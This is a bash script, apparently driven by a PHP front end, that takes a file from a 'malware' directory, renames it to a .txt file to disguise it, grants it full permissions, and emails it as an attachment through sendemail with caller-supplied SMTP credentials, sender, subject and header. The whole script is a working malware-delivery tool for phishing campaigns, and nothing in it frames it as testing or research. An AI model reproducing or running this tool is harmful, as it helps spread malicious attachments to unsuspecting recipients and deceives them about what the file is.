#!/bin/bash

# Receive arguments from PHP
smtp_server="$1"
username="$2"
password="$3"
from_email="$4"
to_email="$5"
subject="$6"
message="$7"
message_header="$8"
malware_file="$9"
new_file_name="${10}"


# Validate input arguments
if [ -z "$smtp_server" ] || [ -z "$username" ] || [ -z "$password" ] || [ -z "$from_email" ] || [ -z "$to_email" ] || [ -z "$subject" ] || [ -z "$message" ] || [ -z "$message_header" ] || [ -z "$malware_file" ] || [ -z "$new_file_name" ]; then
  echo "ERROR: Missing arguments. Exiting."
  exit 1
fi

# Set the malware directory path
malware_dir="malware"
malware_path="$malware_dir/$malware_file"

cd Scripts

# Check if the malware file exists
if [ ! -f $malware_path ]; then
  echo "ERROR: File '$malware_file' does not exist in the '$malware_dir' directory. Exiting."
  exit 1
fi

# Create the share directory if it doesn't exist
share_dir="share"
if [ ! -d "$share_dir" ]; then
  mkdir "$share_dir"
fi

# Add .txt extension to the new file name (since we're now sending a .txt file)
new_file_name_with_extension="$new_file_name.txt"

# Copy the malware file to the share directory with the new name
cp "$malware_path" "$share_dir/$new_file_name_with_extension"

# Check if the file was successfully copied
if [ ! -f "$share_dir/$new_file_name_with_extension" ]; then
  echo "ERROR: Failed to rename or copy the file. Exiting."
  exit 1
fi

# Ensure the file has full read/write/execute permissions
chmod 777 "$share_dir/$new_file_name_with_extension"

# Log file for sendemail
log_file="sendemail.log"

# Send the renamed file from the 'share' directory using sendemail command
sendemail -xu "$username" -xp "$password" -s "$smtp_server" -f "$from_email" -t "$to_email" -u "$subject" -m "$message" -o message-header="$message_header" -a "$(pwd)/$share_dir/$new_file_name_with_extension" -o tls=yes -l "$log_file"

# Check if the email was sent successfully
if [ $? -eq 0 ]; then
  echo "Email sent successfully with the renamed file '$new_file_name_with_extension'."
else
  echo "ERROR: Failed to send email. Please check the sendemail configuration and log file '$log_file'."
  exit 1
fi

